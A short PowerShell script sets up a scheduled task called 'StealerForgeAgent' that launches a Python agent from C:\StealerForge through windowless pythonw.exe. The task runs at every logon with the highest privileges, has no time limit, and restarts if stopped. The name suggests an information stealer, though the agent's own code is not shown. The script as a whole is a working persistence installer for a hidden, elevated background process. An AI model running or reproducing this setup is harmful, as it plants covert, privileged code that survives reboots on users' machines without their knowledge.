$ErrorActionPreference = 'Stop'
$action = New-ScheduledTaskAction -Execute 'C:\StealerForge\Python\pythonw.exe' -Argument 'C:\StealerForge\agent.py'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$principal = New-ScheduledTaskPrincipal -UserId $identity -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName 'StealerForgeAgent' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName 'StealerForgeAgent'
